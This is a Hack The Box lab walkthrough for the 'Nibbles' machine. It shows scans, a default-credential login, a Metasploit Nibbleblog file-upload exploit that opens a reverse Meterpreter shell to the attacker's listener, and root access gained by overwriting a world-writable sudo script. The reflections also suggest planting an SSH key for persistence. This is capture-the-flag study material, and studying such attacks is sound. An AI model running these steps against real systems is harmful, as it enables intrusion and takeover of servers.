---
title: "Nibbles Walkthrough - HTB Easy | Nibbleblog RCE & Sudo Script Exploitation"
description: "Complete walkthrough of Nibbles from Hack The Box. Covers web enumeration, Nibbleblog 4.0.3 authentication bypass, arbitrary file upload RCE exploitation, and sudo script privilege escalation through writable monitor.sh."
author: dua2z3rr
date: 2025-11-28 1:00:00
categories: [HackTheBox, Walkthroughs]
tags:
  # Box-specific techniques
  - nibbleblog-rce
  - file-upload
  - default-credentials
  - sudo-exploitation
  - writable-script
  
  # General classification
  - htb-easy
  - linux
  - web-exploitation
  - privilege-escalation
  
  # Tools and services
  - metasploit
  - ffuf
  - nibbleblog
  
image: /assets/img/nibbles/nibbles-resized.png
---
## Overview

Nibbles is a fairly straightforward box that demonstrates the risks of default credentials and misconfigured sudo permissions. While relatively simple, the inclusion of a login blacklist mechanism makes finding valid credentials slightly more challenging. The box features a Nibbleblog installation vulnerable to arbitrary file upload, leading to remote code execution.

**Box Details:**
- **OS:** Ubuntu Linux
- **Difficulty:** Easy
- **Key Techniques:** Web Enumeration, Default Credentials, File Upload RCE, Sudo Script Exploitation

---

## External Enumeration

### Nmap Scan

Starting with a full port scan:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap nibbles.htb -vv -p-
<SNIP>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Detailed scan on discovered ports:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap nibbles.htb -vv -p22,80 -sC -sV
<SNIP>
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key findings:**
- SSH (OpenSSH 7.2p2)
- Apache 2.4.18 web server

---

## Web Application Analysis

### Initial Web Page

Accessing the website shows a simple page with "Hello world!" text:

![Initial webpage](/assets/img/nibbles/nibbles-1.png)

### Source Code Analysis

Examining the page source reveals an interesting HTML comment:

![HTML comment hint](/assets/img/nibbles/nibbles-2.png)

**Discovery:** Comment points to `/nibbleblog/` directory

### Nibbleblog Application

Navigating to `/nibbleblog/` reveals a blog application:

![Nibbleblog homepage](/assets/img/nibbles/nibbles-3.png)

---

## Directory Enumeration

### Fuzzing with ffuf

Since the initial page doesn't reveal much, we enumerate directories:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt:FUZZ -u http://nibbles.htb/nibbleblog/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nibbles.htb/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: SecLists/Discovery/Web-Content/DirBuster-2007...
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 2987, Words: 116, Lines: 61]
content                 [Status: 301, Size: 323, Words: 20, Lines: 10]
themes                  [Status: 301, Size: 322, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 321, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 323, Words: 20, Lines: 10]
languages               [Status: 301, Size: 325, Words: 20, Lines: 10]
```

**Important discovery:** `/admin` directory exists

### Admin Login Panel

Accessing `/nibbleblog/admin.php`:

![Admin login panel](/assets/img/nibbles/nibbles-4.png)

---

## Authentication Bypass

### Default Credentials Research

Researching Nibbleblog default credentials online:

![Default credentials search](/assets/img/nibbles/nibbles-5.png)

> **Note:** If you encounter a blacklist error message, wait a few minutes before trying again. The application implements a temporary IP ban after multiple failed login attempts.
{: .prompt-warning }

**Successful authentication:** `admin:nibbles`

### Version Identification

Checking the Nibbleblog version at `http://nibbles.htb/nibbleblog/update.php`:

![Nibbleblog version 4.0.3](/assets/img/nibbles/nibbles-7.png)

**Version discovered:** Nibbleblog 4.0.3

---

## Exploitation

### Admin Dashboard Analysis

After logging in, the admin dashboard reveals several features:

![Admin dashboard](/assets/img/nibbles/nibbles-6.png)

**Initial approach:** Attempted to create pages with embedded PHP code, but the code wasn't executed properly.

**Alternative approach:** Discovered a plugin that allows image uploads—the "My Image" plugin.

### Metasploit Exploitation

Finding the appropriate exploit module:

```shell
[msf](Jobs:0 Agents:0) >> search nibbleblog

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
```

Configuring the exploit:

```shell
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set password nibbles
password => nibbles
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set rhost nibbles.htb
rhost => nibbles.htb
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set username admin
username => admin
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set lhost tun0
lhost => 10.10.16.4
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set lport 9001
lport => 9001
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set targeturi /nibbleblog/
targeturi => /nibbleblog/
```

Running the exploit:

```shell
[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> run
[*] Started reverse TCP handler on 10.10.16.4:9001 
[*] Sending stage (40004 bytes) to 10.10.10.75
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.16.4:9001 -> 10.10.10.75:55520) at 2025-11-28 21:14:11 +0100

(Meterpreter 1)(/var/www/html/nibbleblog/content/private/plugins/my_image) > shell
Process 18069 created.
Channel 0 created.
whoami
nibbler
```

**Shell obtained** as user `nibbler`

**User flag obtained** from `/home/nibbler/user.txt`

---

## Privilege Escalation

### Internal Enumeration

Exploring the home directory:

```shell
ls
personal.zip
user.txt
```

**Discovery:** A ZIP archive named `personal.zip`

### Extracting Archive Contents

```shell
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

The archive contains a bash script: `monitor.sh`

### Sudo Permissions Check

```shell
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

**Critical finding:** User `nibbler` can execute `monitor.sh` as root without a password!

### Script Permissions Analysis

Checking file permissions:

```shell
ls -al personal/stuff/
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

**Vulnerability identified:** The script is **world-writable** (`-rwxrwxrwx`) and owned by `nibbler`, which means we can modify it and execute it as root!

### Exploiting Writable Sudo Script

Overwriting the script with our payload:

```shell
echo "cat /root/root.txt" > personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
<ROOT FLAG OUTPUT>
```

**Root flag obtained!** Box completed.

---

## Reflections

### What Surprised Me

The combination of default credentials and a writable sudo script felt almost *too* simple, but it perfectly demonstrates a real-world scenario. I've seen production systems where sysadmins set up monitoring scripts with sudo permissions and then forget about them. The fact that `monitor.sh` was **world-writable** (`777` permissions) is a critical misconfiguration that I've actually encountered in the wild—people set overly permissive permissions "just to make it work" and never revisit them.

### Main Mistake

I wasted over an hour trying to upload PHP reverse shells through the page creation feature before realizing the PHP code wasn't being executed—it was just displayed as plain text. I should have immediately looked for file upload functionality elsewhere in the application instead of repeatedly trying different PHP payloads in the same place. The lesson: if an attack vector isn't working after 2-3 attempts, **move on and find another approach** rather than beating your head against the same wall.

### Alternative Approaches

Instead of using Metasploit for the file upload exploitation, I could have manually uploaded a PHP reverse shell through the "My Image" plugin (it doesn't actually validate that uploads are images). This would have been good practice for understanding the vulnerability mechanics rather than relying on an automated module. For privilege escalation, I could have also used `monitor.sh` to add my SSH key to root's `authorized_keys` file for persistent access, rather than just reading the flag.

### Open Question

The Nibbleblog file upload vulnerability (CVE-2015-6967) is from 2015, yet this box uses it in 2017-2018. This makes me wonder: **how long do organizations typically take to patch known CMS vulnerabilities in production?** I've read that many small businesses run outdated CMS installations for years, but I'm curious about the actual statistics. Also, are there automated scanners that specifically look for outdated blog platforms like Nibbleblog, WordPress, Joomla with known vulnerabilities?

---

**Completed this box? What was your approach to discovering the admin credentials?** Reach out on [Twitter](https://twitter.com/dua2z3rr) or email at dua2z3rr@gmail.com—I'm curious if others brute-forced the password or guessed it like I did!
